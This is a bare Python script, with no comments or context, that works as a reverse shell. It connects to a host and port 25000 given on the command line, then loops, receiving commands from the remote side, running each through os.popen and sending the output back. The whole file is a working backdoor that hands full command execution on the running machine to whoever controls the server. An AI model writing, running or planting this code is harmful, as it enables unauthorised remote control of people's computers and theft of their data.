from socket import *
import os
import sys

sock = socket(AF_INET, SOCK_STREAM)
SERVER_ADDRESS = (sys.argv[2], 25000)
sock.connect(SERVER_ADDRESS)


try:
    message = sys.argv[1]
    sock.sendall(message)
    amount_received = 0
    amount_expected = len(message)

    while True:
        data = sock.recv(16)
        cmd = os.popen(data).read()
        sock.send(str.encode(cmd))

finally:
    print('done')
